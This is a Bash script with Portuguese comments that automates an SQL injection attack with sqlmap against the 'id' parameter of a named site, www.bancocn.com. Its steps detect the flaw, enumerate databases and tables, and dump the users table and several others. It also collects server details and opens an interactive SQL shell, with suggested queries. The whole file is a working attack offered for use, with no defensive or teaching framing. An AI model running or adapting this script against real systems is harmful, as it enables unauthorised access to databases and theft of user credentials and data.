#!/bin/bash

# Script de Exploração SQL Injection - BancoCN
# Uso: ./exploit_bancocn.sh

URL="http://www.bancocn.com/cat.php?id=1"
PARAM="id"
DB="bancocn"
TABLE_USERS="users"
TABLE_PICTURES="pictures"

echo "=========================================="
echo "  Script de Exploração SQL Injection"
echo "  Target: $URL"
echo "=========================================="
echo ""

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Função para executar comandos sqlmap
run_sqlmap() {
    local cmd="$1"
    local description="$2"
    
    echo -e "${YELLOW}[*]${NC} $description"
    echo -e "${YELLOW}[*]${NC} Executando: sqlmap $cmd"
    echo ""
    
    sqlmap $cmd
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+]${NC} Comando executado com sucesso!"
    else
        echo -e "${RED}[-]${NC} Erro ao executar comando"
    fi
    echo ""
    echo "----------------------------------------"
    echo ""
}

# Etapa 1: Detecção inicial de SQL Injection
echo -e "${GREEN}[ETAPA 1]${NC} Detecção de SQL Injection"
run_sqlmap "-u \"$URL\" -p $PARAM --dbms=mysql --batch" "Detectando vulnerabilidade SQL Injection"

# Etapa 2: Listar bancos de dados
echo -e "${GREEN}[ETAPA 2]${NC} Listando bancos de dados"
run_sqlmap "-u \"$URL\" -p $PARAM --dbs --batch" "Listando todos os bancos de dados"

# Etapa 3: Listar tabelas do banco bancocn
echo -e "${GREEN}[ETAPA 3]${NC} Listando tabelas do banco '$DB'"
run_sqlmap "-u \"$URL\" -p $PARAM -D $DB --tables --batch" "Listando tabelas do banco $DB"

# Etapa 4: Listar colunas da tabela users
echo -e "${GREEN}[ETAPA 4]${NC} Listando colunas da tabela '$TABLE_USERS'"
run_sqlmap "-u \"$URL\" -p $PARAM -D $DB -T $TABLE_USERS --columns --batch" "Listando colunas da tabela $TABLE_USERS"

# Etapa 5: Dump da tabela users
echo -e "${GREEN}[ETAPA 5]${NC} Fazendo dump da tabela '$TABLE_USERS'"
run_sqlmap "-u \"$URL\" -p $PARAM -D $DB -T $TABLE_USERS --dump --batch" "Extraindo dados da tabela $TABLE_USERS"

# Etapa 6: Dump da tabela pictures
echo -e "${GREEN}[ETAPA 6]${NC} Fazendo dump da tabela '$TABLE_PICTURES'"
run_sqlmap "-u \"$URL\" -p $PARAM -D $DB -T $TABLE_PICTURES --dump --batch" "Extraindo dados da tabela $TABLE_PICTURES"

# Etapa 7: Dump de outras tabelas
echo -e "${GREEN}[ETAPA 7]${NC} Fazendo dump das outras tabelas"
run_sqlmap "-u \"$URL\" -p $PARAM -D $DB -T categories --dump --batch" "Extraindo dados da tabela categories"
run_sqlmap "-u \"$URL\" -p $PARAM -D $DB -T stats --dump --batch" "Extraindo dados da tabela stats"

# Etapa 8: Informações do sistema
echo -e "${GREEN}[ETAPA 8]${NC} Coletando informações do sistema"
run_sqlmap "-u \"$URL\" -p $PARAM --sql-query=\"SELECT @@version, @@hostname, USER(), DATABASE()\" --batch" "Coletando informações do banco de dados"

# Etapa 9: SQL Shell interativo
echo -e "${GREEN}[ETAPA 9]${NC} Abrindo SQL Shell interativo"
echo -e "${YELLOW}[*]${NC} Você pode executar queries SQL diretamente"
echo -e "${YELLOW}[*]${NC} Digite 'q' ou 'x' para sair"
echo ""
echo "Exemplos de queries úteis:"
echo "  SELECT * FROM users;"
echo "  SELECT table_name FROM information_schema.tables WHERE table_schema='$DB';"
echo "  SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';"
echo "  SELECT @@version;"
echo "  SELECT @@secure_file_priv;"
echo "  SELECT CURRENT_USER();"
echo ""
echo "Pressione ENTER para abrir o SQL shell..."
read

sqlmap -u "$URL" -p $PARAM --sql-shell

echo ""
echo -e "${GREEN}[+]${NC} Exploração concluída!"
echo -e "${YELLOW}[*]${NC} Dados salvos em: ~/.local/share/sqlmap/output/www.bancocn.com/"

